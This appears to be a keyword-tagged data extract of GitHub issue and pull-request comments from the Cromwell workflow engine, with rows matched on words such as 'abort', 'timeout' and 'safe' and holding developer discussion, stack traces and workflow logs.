Safety," the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/jes/src/test/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActorSpec.scala: // TODO: PBE: This spec may run faster by going back to mocks? Also, building the actor ref is copy/pasted a lot; ./supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystemAsyncJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: This test needs work. If the abort fires to quickly, it causes a race condition in waitAndPostProcess.; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: abort doesn't actually seem to abort. It runs the full 10 seconsds, then returns the response.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:2787,abort,abort,2787,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,3,['abort'],['abort']
Safety,"""Absence of evidence is not evidence of absence"", but still... ""proof"" these changes didn't make any thing worse in Jenkins, so far.; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/778/. Also [this log](https://travis-ci.org/broadinstitute/cromwell/jobs/445976070) shows a 10s timeout for the additionally patched `SimpleWorkflowActorSpec`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4313#issuecomment-432909067:305,timeout,timeout,305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4313#issuecomment-432909067,1,['timeout'],['timeout']
Safety,"""This"" is the original topic, copying outputs to different locations. It could be a way to ""flatten"" directories. However, as you noted on the [other issue](https://github.com/broadinstitute/cromwell/issues/1641), there is the risk of overwriting results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1642#issuecomment-345035327:227,risk,risk,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1642#issuecomment-345035327,1,['risk'],['risk']
Safety,"* This actually has been officially removed from the draft-3 spec on account of it never being implemented by any engine.; * The read_json and write_json (and structs in draft-3) will hopefully ease a lot of the annoyances you're finding here (it's been known to be annoying, we're just finally able to put resources towards easing it now); * All WDL values are immutable as an early design choice for the language. Think of them less as variables in an imperative language and more as write-once declarations in a DAG (ie an execution graph). Say some subsequent task uses (edit: ~~len~~) `i` in your example above. If values are mutable then how can Cromwell know when it's safe to use the value? If you force all tasks to complete before anything after them starts then one slow task cannot run in parallel with several fast tasks.; * I think what you really want is some kind of list comprehension (eg equivalent to python's `[x + 1 for x in x_list]`). You can get something similar by using the implicit gather on a scatter. eg I could map over an array to calculate the ""values plus one"" array like this:; ```wdl; workflow foo {; Array[Int] input_array; scatter(i in input_array) {; plus_ones = i + 1; }; Array[Int] input_array_plus_ones = plus_ones # gathers the results from the plus-one'ing; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367445161:676,safe,safe,676,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367445161,1,['safe'],['safe']
Safety,"** (2 minutes, 47 seconds); - should successfully run inline_file *** FAILED *** (3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.instant_abort (5 seconds, 52 milliseconds); - should abort a workflow mid run abort.scheduled_abort (2 minutes, 20 seconds); - should abort a workflow mid run abort.sub_workflow_abort (3 minutes, 2 seconds); - should call cache the second run of cacheBetweenWF (2 minutes, 55 seconds); - should call cache the second run of call_cache_hit_prefixes_no_hint (1 minute, 40 seconds); - should call cache the second run of floating_tags (3 minutes, 25 seconds); - should fail during execution bad_docker_name (35 seconds, 238 milliseconds); - should fail during execution bad_workflow_failure_mode (5 seconds, 920 milliseconds); - should fail during execution chainfail (42 seconds, 454 milliseconds); - should fail during execution cont_while_possible (3 minutes, 57 seconds); - should fail during execution cont_while_possible_scatter (2 minutes, 27 seconds); - should fail during execution draft3_read_file_limits (3 minutes, 26 seconds); - should fail during execution empty_filename (16 seconds, 333 milliseconds); - should fail during execut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2630,abort,abort,2630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"**@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1572,timeout,timeout,1572,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['timeout'],['timeout']
Safety,"+1 to this feature. Is there a feature request submitted to the Cloud Health team to have the Pipelines API v2 distinguish regular preemption vs. preemption at 24 hours?. We needed to workaround this recently for an RNA alignment workflow (using STAR). What we did was to use the [timeout](https://linux.die.net/man/1/timeout) command:. ```; timeout 23.5h STAR <args>; ```. - We made it 23.5 hours to account for localization and delocalization time.; - By using the timeout, we got a hard-failure and avoided the ""run 24 hours and get preempted and retried"" cycle.; - We then manually re-ran these failures, setting the preemptible retries to 0 (and removing the timeout). . Managing the workflows in Terra made this all relatively painless.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499563563:281,timeout,timeout,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499563563,6,"['avoid', 'timeout']","['avoided', 'timeout']"
Safety,"-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-11-21 15:09:44,62] [info] WorkflowLogCopyRouter stopped; [2018-11-21 15:09:44,62] [info] JobExecutionTokenDispenser stopped; [2018-11-21 15:09:44,62] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor All workflows finished; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor stopped; [2018-11-21 15:09:44,62] [info] Connection pools shut down; [2018-11-21 15:09:44,62] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] SubWorkflowStoreActor stopped; [2018-11-21 15:09:44,63] [info] JobStoreActor stopped; [2018-11-21 15:09:44,63] [info] DockerHashActor stopped; [2018-11-21 15:09:44,63] [info] IoProxy stopped; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor stopped; [2018-11-21 15:09:44,63] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] ServiceRegistryActor stopped; [2018-11-21 15:09:44,65] [info] Database closed; [2018-11-21 15:09:44,65] [info] Stream materializer shut down; [2018-11-21 15:09:44,66] [info] WDL HTTP import resolver closed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:5810,Timeout,Timeout,5810,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,3,['Timeout'],['Timeout']
Safety,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2370,safe,safety,2370,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452,3,"['risk', 'safe']","['risk', 'safe', 'safety']"
Safety,.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:33); 	a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1417,Timeout,TimeoutExceptionHandlingStage,1417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,"/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; > request, timeout=timeout_property).read(); > File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; > response = self._open(req, data); > File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; > '_open', req); > File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; > result = func(*args); > File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; > return self.do_open(httplib.HTTPConnection, req); > File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; > r = h.getresponse(buffering=True); > File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; > response.begin(); > File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; > version, status, reason = self._read_status(); > File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; > line = self.fp.readline(); > File ""/usr/lib/python2.7/socket.py"", line 447, in readline; > data = self._sock.recv(self._rbufsize); > socket.timeout: timed out; > :; >; > This is a gsutil stacktrace. JES tried to copy the logs and failed, hence; > failing the job and the workflow. They might want to retry this - although; > we've been telling them to stop retrying too much on some things so I don't; > know. @geoffjentry <https://github.com/geoffjentry> and @cjllanwarne; > <https://github.com/cjllanwarne> were talking about it on slack maybe; > they have an opinion.; >; > For call caching: it will get slower and slower. Basically the more jobs; > you run the slower it's going to be... I'm working on something to fix that; > but it's not in develop yet.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk6vHuB6D3iMODjERjQgj6h_SG4z2ks5r15JkgaJpZM4NNP8f>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027:3697,timeout,timeout,3697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027,1,['timeout'],['timeout']
Safety,"0.4 is the latest release... according to github... (Yes, I realize that there have been tags since, but in the past, I had; been told to avoid these). On Tue, Jan 10, 2017 at 4:24 PM, Thib <notifications@github.com> wrote:. > It's expected that wdltool 0.4 will not validate this as the String; > main_output = hello_and_goodbye.hello_output syntax in workflow outputs; > was introduced specifically for sub workflows which wdltool 0.4 pre-dates.; > Try to update to the latest version of wdltool and it should validate.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk2mhGzhFvb8rAvqTnkXnmX_L-KYAks5rQ_bwgaJpZM4Lf57n>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642:138,avoid,avoid,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642,1,['avoid'],['avoid']
Safety,"01, in _GetProperty; > value = _GetPropertyWithoutDefault(prop, properties_file); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; > value = callback(); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; > return c_gce.Metadata().Project(); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; > gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; > return func(*args, **kwargs), None; > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; > return gce_read.ReadNoProxy(uri); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; > request, timeout=timeout_property).read(); > File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; > response = self._open(req, data); > File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; > '_open', req); > File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; > result = func(*args); > File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; > return self.do_open(httplib.HTTPConnection, req); > File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; > r = h.getresponse(buffering=True); > File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; > response.begin(); > File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; > version, status, reason = self._read_status(); > File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; > line = self.fp.readline(); > File ""/usr/lib/python2.7/socket.py"", line 447, in readline; > data = self._sock.recv(self._rbufsize); > socket.timeout: timed out; > :; >; > This is a gsutil stacktrace. JES tried to cop",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027:2779,timeout,timeout,2779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027,1,['timeout'],['timeout']
Safety,"1. Oops, yes, I meant `exit-code-timeout-seconds`. ; 2. I think that the `unrelated to this timeout` side note is no longer accurate - the polling actually happens at the exact interval of the timeout now!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486221911:33,timeout,timeout-seconds,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486221911,3,['timeout'],"['timeout', 'timeout-seconds']"
Safety,"24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2348,Abort,Abort,2348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2651,Abort,Abort,2651,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2955,Abort,Abort,2955,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
